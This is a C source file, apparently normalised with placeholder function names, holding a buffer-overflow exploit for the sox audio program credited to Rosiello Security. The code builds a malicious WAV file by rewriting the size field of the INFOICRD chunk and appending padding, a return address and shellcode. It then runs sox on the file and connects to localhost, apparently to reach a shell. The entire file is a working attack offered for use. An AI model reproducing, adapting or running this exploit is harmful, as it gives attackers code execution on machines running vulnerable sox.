#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */
typedef  struct TYPE_2__   TYPE_1__ ;

/* Type definitions */
typedef  scalar_t__ pid_t ;
typedef  int /*<<< orphan*/  payload ;
struct TYPE_2__ {int /*<<< orphan*/  ret; } ;

/* Variables and functions */
 int EXIT_SUCCESS ; 
 int O_CREAT ; 
 int /*<<< orphan*/  O_RDWR ; 
 int O_TRUNC ; 
 int O_WRONLY ; 
 int FUNC0 (char*) ; 
 int /*<<< orphan*/  FUNC1 (int) ; 
 scalar_t__ FUNC2 (char*) ; 
 int /*<<< orphan*/  FUNC3 (char*,char*,char*,char*,char*,char*,int /*<<< orphan*/ *) ; 
 scalar_t__ FUNC4 () ; 
 char* FUNC5 (char*,int /*<<< orphan*/ *,int /*<<< orphan*/ ,int*) ; 
 scalar_t__ FUNC6 (int) ; 
 char* memap ; 
 int /*<<< orphan*/  FUNC7 (char*,int,int) ; 
 int FUNC8 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 int /*<<< orphan*/  shellcode ; 
 int /*<<< orphan*/  FUNC11 (int) ; 
 int FUNC12 (char*,char*,char*,int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC13 (char*,char*,int) ; 
 TYPE_1__* target ; 
 int /*<<< orphan*/  FUNC14 (char*) ; 
 int /*<<< orphan*/  FUNC15 (int,char*,int) ; 

int FUNC16(int argc, char **argv)
{

  char *ptr,*tmp;
  int fd,count;
  long sizefield,sizeloc;
  int size;
  char payload[500];
  pid_t pid;
  int opt;
  if ((argc) != 4)
    FUNC14(argv[0]);
  opt=FUNC0(argv[3]);

  memap = FUNC5(argv[1],NULL,O_RDWR,&size);

  FUNC10("[+] Sox Exploiter by Rosiello Security\n");
  FUNC10("[+] Opened %s size : %d\n",argv[1],size);


  ptr = memap;
  count =0;
  do
  {
   ptr++;
   if ((FUNC13("INFOICRD",ptr,8)==0)) break;

  } while ( (count ++ !=size) );

  tmp = (char *)FUNC6 ( size + 512);
  tmp = memap;

  ptr +=8;
  sizefield = (long) ptr[0];
  sizeloc = (long) (count + 8)+1;

  tmp[sizeloc]=01;
  tmp[sizeloc+1]=02;

  if ((fd=FUNC8 ( argv[2] , O_WRONLY | O_CREAT | O_TRUNC,0666)) == -1) {
   FUNC9("open");
   return -1;
  }

  sizeloc +=2;
  FUNC15(fd,tmp,sizeloc);

  FUNC7(payload,0x2e,318);

  size=FUNC12(payload+318,"%s%s",((char *)&target[opt].ret),shellcode);


  FUNC15 (fd,payload,sizeof(payload));
  FUNC1(fd);

  size = 0x0102 - size;

  FUNC10("[+] Coded by rave & Angelo Rosiello\n");
  FUNC10("[+] Writing evil code into %s\n", argv[2]);
  FUNC10("[+] Org sizefield = %d new sizefield = %d\n",sizefield,0x0102);
  FUNC10("[+] Overflowing the buffer with %d Bytes\n",size);
  FUNC10("[+] Executing /usr/bin/sox\n");
  FUNC10("[+] Connecting to localhost\n");

  pid = FUNC4();
  if (pid ==0) {
    FUNC3("/usr/bin/sox","sox",argv[2],"-t","ossdsp","/dev/dsp" ,NULL);

   };

  FUNC11(1);
  if ((FUNC2("127.0.0.1")) <0)
    FUNC10("[-] Exploit failed\n");

  return EXIT_SUCCESS;
}